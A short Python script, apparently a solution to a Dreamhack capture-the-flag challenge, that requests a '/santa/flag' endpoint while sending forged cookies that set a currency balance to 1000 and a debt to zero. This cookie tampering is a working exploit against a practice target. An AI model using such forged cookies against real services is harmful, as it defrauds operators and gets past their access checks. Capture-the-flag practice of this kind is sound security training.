import requests

r = requests.session()
url = "http://host3.dreamhack.games:14899/santa/flag"
cookies = {"session":"", "DHH":"1000.0", "debt_DHH":"0.0"}
res = r.get(url, cookies=cookies)
print(res.text)